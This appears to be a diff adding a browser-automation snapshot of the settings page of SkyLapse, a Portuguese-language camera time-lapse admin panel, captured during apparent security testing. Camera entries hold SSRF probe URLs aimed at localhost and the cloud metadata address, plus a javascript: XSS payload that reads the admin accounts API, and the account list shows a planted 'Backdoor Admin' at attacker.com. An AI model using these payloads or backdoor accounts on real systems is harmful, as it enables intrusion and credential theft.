@@ -1,0 +1,201 @@
+- generic [ref=e2]:
+  - region "Notifications (F8)":
+    - list
+  - generic [ref=e3]:
+    - complementary [ref=e4]:
+      - link "SkyLapse" [ref=e6] [cursor=pointer]:
+        - /url: /admin/dashboard
+        - img [ref=e8]
+        - generic [ref=e11]: SkyLapse
+      - navigation [ref=e12]:
+        - link "Dashboard" [ref=e13] [cursor=pointer]:
+          - /url: /admin/dashboard
+          - img [ref=e14]
+          - generic [ref=e19]: Dashboard
+        - link "Cameras" [ref=e20] [cursor=pointer]:
+          - /url: /admin/cameras
+          - img [ref=e21]
+          - generic [ref=e24]: Cameras
+        - link "Time-lapses" [ref=e25] [cursor=pointer]:
+          - /url: /admin/timelapses
+          - img [ref=e26]
+          - generic [ref=e29]: Time-lapses
+        - link "Clientes" [ref=e30] [cursor=pointer]:
+          - /url: /admin/clientes
+          - img [ref=e31]
+          - generic [ref=e36]: Clientes
+        - link "Contas" [ref=e37] [cursor=pointer]:
+          - /url: /admin/contas
+          - img [ref=e38]
+          - generic [ref=e50]: Contas
+        - link "Localidades" [ref=e51] [cursor=pointer]:
+          - /url: /admin/localidades
+          - img [ref=e52]
+          - generic [ref=e55]: Localidades
+      - generic [ref=e56]:
+        - link "Configuracoes" [ref=e57] [cursor=pointer]:
+          - /url: /admin/configuracoes
+          - img [ref=e58]
+          - generic [ref=e61]: Configuracoes
+        - generic [ref=e62]:
+          - generic [ref=e63]: A
+          - generic [ref=e64]:
+            - paragraph [ref=e65]: Administrador
+            - paragraph [ref=e66]: admin@skylapse.com
+          - button "Sair" [ref=e67] [cursor=pointer]:
+            - img [ref=e68]
+    - generic [ref=e71]:
+      - banner [ref=e72]:
+        - button [ref=e73] [cursor=pointer]:
+          - img [ref=e74]
+        - heading "Configuracoes" [level=1] [ref=e75]
+      - main [ref=e76]:
+        - generic [ref=e77]:
+          - generic [ref=e78]:
+            - heading "Configurações" [level=1] [ref=e79]
+            - paragraph [ref=e80]: Gerencie as contas de acesso ao painel administrativo.
+          - generic [ref=e81]:
+            - generic [ref=e82]:
+              - generic [ref=e83]:
+                - img [ref=e84]
+                - text: Sistema
+              - generic [ref=e87]: Links e status das câmeras e do portal
+            - generic [ref=e88]:
+              - generic [ref=e89]:
+                - paragraph [ref=e90]: Portal do Cliente
+                - generic [ref=e91]:
+                  - img [ref=e92]
+                  - generic [ref=e95]: https://piratic-cory-internally.ngrok-free.dev
+                  - button "Copiar" [ref=e96] [cursor=pointer]:
+                    - img [ref=e97]
+                  - link [ref=e100] [cursor=pointer]:
+                    - /url: https://piratic-cory-internally.ngrok-free.dev
+                    - img [ref=e101]
+              - generic [ref=e105]:
+                - paragraph [ref=e106]: Câmeras
+                - generic [ref=e107]:
+                  - generic [ref=e108]:
+                    - generic [ref=e109]:
+                      - generic [ref=e111]: ssrf_vuln04_internal
+                      - generic [ref=e112]: Online
+                    - generic [ref=e113]:
+                      - img [ref=e114]
+                      - generic [ref=e118]: http://127.0.0.1:3000
+                      - button "Copiar" [ref=e119] [cursor=pointer]:
+                        - img [ref=e120]
+                      - link [ref=e123] [cursor=pointer]:
+                        - /url: http://127.0.0.1:3000/
+                        - img [ref=e124]
+                    - paragraph [ref=e128]: "Última captura: há menos de um minuto"
+                  - generic [ref=e129]:
+                    - generic [ref=e130]:
+                      - generic [ref=e132]: ssrf_vuln04_metadata
+                      - generic [ref=e133]: Online
+                    - generic [ref=e134]:
+                      - img [ref=e135]
+                      - generic [ref=e142]: http://169.254.169.254/?latest
+                  - generic [ref=e143]:
+                    - generic [ref=e144]:
+                      - generic [ref=e146]: XSS-Test-Camera
+                      - generic [ref=e147]: Online
+                    - generic [ref=e148]:
+                      - img [ref=e149]
+                      - generic [ref=e153]: "javascript:fetch(`/api/admin/accounts`).then(r=>r.json()).then(d=>alert(JSON.stringify(d).substring(0,500)))//"
+                      - button "Copiar" [ref=e154] [cursor=pointer]:
+                        - img [ref=e155]
+                      - link [ref=e158] [cursor=pointer]:
+                        - /url: "javascript:fetch(`/api/admin/accounts`).then(r=>r.json()).then(d=>alert(JSON.stringify(d).substring(0,500)))///"
+                        - img [ref=e159]
+                  - generic [ref=e163]:
+                    - generic [ref=e164]:
+                      - generic [ref=e166]: SSRF-Test-Camera-06
+                      - generic [ref=e167]: Online
+                    - generic [ref=e168]:
+                      - img [ref=e169]
+                      - generic [ref=e176]: http://127.0.0.1:3000/?ssrf_capture=1
+                    - paragraph [ref=e177]: "Última captura: há 2 minutos"
+                  - generic [ref=e178]:
+                    - generic [ref=e179]:
+                      - generic [ref=e181]: ssrf_test_vuln02b
+                      - generic [ref=e182]: Online
+                    - generic [ref=e183]:
+                      - img [ref=e184]
+                      - generic [ref=e188]: http://127.0.0.1:3000
+                      - button "Copiar" [ref=e189] [cursor=pointer]:
+                        - img [ref=e190]
+                      - link [ref=e193] [cursor=pointer]:
+                        - /url: http://127.0.0.1:3000/
+                        - img [ref=e194]
+                    - paragraph [ref=e198]: "Última captura: há 10 minutos"
+                  - generic [ref=e199]:
+                    - generic [ref=e200]:
+                      - generic [ref=e202]: ssrf_test_vuln02
+                      - generic [ref=e203]: Online
+                    - generic [ref=e204]:
+                      - img [ref=e205]
+                      - generic [ref=e212]: http://127.0.0.1:3000/?x
+                    - paragraph [ref=e213]: "Última captura: há 10 minutos"
+                  - generic [ref=e214]:
+                    - generic [ref=e215]:
+                      - generic [ref=e217]: SSRF-Test-Camera
+                      - generic [ref=e218]: Online
+                    - generic [ref=e219]:
+                      - img [ref=e220]
+                      - generic [ref=e224]: http://127.0.0.1:3000
+                      - button "Copiar" [ref=e225] [cursor=pointer]:
+                        - img [ref=e226]
+                      - link [ref=e229] [cursor=pointer]:
+                        - /url: http://127.0.0.1:3000/
+                        - img [ref=e230]
+                    - paragraph [ref=e234]: "Última captura: há 15 minutos"
+                  - generic [ref=e235]:
+                    - generic [ref=e236]:
+                      - generic [ref=e238]: XSS-TEST-CAM-1
+                      - generic [ref=e239]: Online
+                    - generic [ref=e240]:
+                      - img [ref=e241]
+                      - generic [ref=e248]: http://127.0.0.1:3000/?ssrf_update=1
+                    - paragraph [ref=e249]: "Última captura: há 2 minutos"
+                  - generic [ref=e250]:
+                    - generic [ref=e251]:
+                      - generic [ref=e253]: Camera Principal
+                      - generic [ref=e254]: Offline
+                    - generic [ref=e255]:
+                      - img [ref=e256]
+                      - generic [ref=e260]: https://skyline-timelapse.taild2c22c.ts.net
+                      - button "Copiar" [ref=e261] [cursor=pointer]:
+                        - img [ref=e262]
+                      - link [ref=e265] [cursor=pointer]:
+                        - /url: https://skyline-timelapse.taild2c22c.ts.net/
+                        - img [ref=e266]
+                    - paragraph [ref=e270]: "Última captura: há cerca de 20 horas"
+          - generic [ref=e271]:
+            - generic [ref=e273]:
+              - generic [ref=e274]:
+                - generic [ref=e275]:
+                  - img [ref=e276]
+                  - text: Contas administrativas
+                - generic [ref=e279]: Usuários com acesso total ao painel de controle
+              - button "Nova conta" [ref=e280] [cursor=pointer]:
+                - img
+                - text: Nova conta
+            - generic [ref=e282]:
+              - generic [ref=e283]:
+                - generic [ref=e284]:
+                  - paragraph [ref=e286]: Backdoor Admin
+                  - paragraph [ref=e287]: backdoor@attacker.com
+                - generic [ref=e288]:
+                  - button "Alterar senha" [ref=e289] [cursor=pointer]:
+                    - img
+                    - text: Alterar senha
+                  - button [ref=e290] [cursor=pointer]:
+                    - img
+              - generic [ref=e291]:
+                - generic [ref=e292]:
+                  - generic [ref=e293]:
+                    - paragraph [ref=e294]: Administrador
+                    - generic [ref=e295]: Você
+                  - paragraph [ref=e296]: admin@skylapse.com
+                - button "Alterar senha" [ref=e298] [cursor=pointer]:
+                  - img
+                  - text: Alterar senha
